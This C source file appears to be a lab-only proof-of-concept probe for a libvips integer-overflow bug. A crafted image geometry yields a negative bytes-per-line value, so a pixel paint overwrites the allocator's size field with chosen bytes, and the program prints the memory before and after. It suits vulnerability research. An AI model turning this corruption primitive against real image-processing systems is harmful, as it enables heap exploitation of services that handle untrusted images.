/* Fine-grained negative-bpl probe for CVE-2026-69242, lab only.
 *
 * W6 used the TIFF-accepted many-band geometry: Bands=10000, bits=32,
 * width=107374 -> ls=4294960000, bpl=-7296. Its negative write lands in
 * unmapped memory and SIGSEGVs. This probe keeps the width under
 * VIPS_MAX_COORD=100000000 but tunes the geometry so ls is just below 2^32:
 *
 *   width=89478485, Bands=12, bits=32 -> ps=48, ls=4294967280 = 2^32-16
 *   -> (int) bpl = -16.
 *
 * vips_tracked_free() reads the tracked size from data-16..data-9
 * (memory.c:220-221 pinned). A one-pel, two-line vips_region_paint_pel()
 * has ws=48 and memcpy(q, to, 48) with q = to - 16, so it overwrites that
 * live size field plus the 8 unused prefix bytes plus 32 image bytes.
 *
 * No TIFF decode, no network, no command, no marker claim. The chosen bytes
 * are 0x41 (not a pointer, not code). Fixed tree and safe geometry are
 * controls. Plain (non-ASan) builds are required to observe allocator bytes.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vips/vips.h>

static void
dump_prefix(const char *label, unsigned char *data)
{
	int i;

	printf("%s data=%p\n", label, (void *) data);
	for (i = -32; i < 16; i++) {
		if ((i + 32) % 8 == 0)
			printf("  %+4d:", i);
		printf(" %02x", data[i]);
		if ((i + 32) % 8 == 7)
			printf("\n");
	}
	fflush(stdout);
}

int
main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "craft";
	int xsize = !strcmp(mode, "safe") ? 64 : 89478485;
	int bands = 12;
	int height = 2;
	VipsImage *im;
	VipsRegion *reg;
	VipsRect r;
	unsigned char ink[64];
	size_t before, after;

	if (VIPS_INIT(argv[0]))
		return 1;

	im = vips_image_new_memory();
	im->Xsize = xsize;
	im->Ysize = height;
	im->Bands = bands;
	im->BandFmt = VIPS_FORMAT_UINT;
	im->Coding = VIPS_CODING_NONE;
	im->Type = VIPS_INTERPRETATION_MULTIBAND;

	if (vips_image_write_prepare(im)) {
		printf("IMAGE=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		g_object_unref(im);
		vips_shutdown();
		return 0;
	}

	printf("IMAGE mode=%s Xsize=%d Ysize=%d Bands=%d BandFmt=%d "
		"sizeof_line=%" G_GUINT64_FORMAT
		" sizeof_image=%" G_GUINT64_FORMAT " data=%p\n",
		mode, im->Xsize, im->Ysize, im->Bands, im->BandFmt,
		VIPS_IMAGE_SIZEOF_LINE(im), VIPS_IMAGE_SIZEOF_IMAGE(im),
		(void *) im->data);
	fflush(stdout);

	before = *(size_t *) ((char *) im->data - 16);
	printf("TRACKED_SIZE_BEFORE=0x%zx\n", before);
	dump_prefix("PREFIX_BEFORE", (unsigned char *) im->data);

	reg = vips_region_new(im);
	r.left = 0;
	r.top = 0;
	r.width = 1;
	r.height = 2;
	if (vips_region_image(reg, &r)) {
		printf("REGION=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		g_object_unref(reg);
		g_object_unref(im);
		vips_shutdown();
		return 0;
	}
	printf("REGION bpl=%d lskip=%" G_GUINT64_FORMAT
		" valid={%d,%d,%d,%d} ws=%d\n",
		reg->bpl, (guint64) VIPS_REGION_LSKIP(reg),
		reg->valid.left, reg->valid.top,
		reg->valid.width, reg->valid.height,
		r.width * (int) VIPS_IMAGE_SIZEOF_PEL(im));
	fflush(stdout);

	memset(ink, 0x5a, sizeof(ink));
	memset(ink, 0x41, 8);
	vips_region_paint_pel(reg, &r, ink);
	printf("PAINT_DONE\n");

	after = *(size_t *) ((char *) im->data - 16);
	printf("TRACKED_SIZE_AFTER=0x%zx\n", after);
	dump_prefix("PREFIX_AFTER", (unsigned char *) im->data);

	g_object_unref(reg);
	g_object_unref(im);
	vips_shutdown();
	return 0;
}
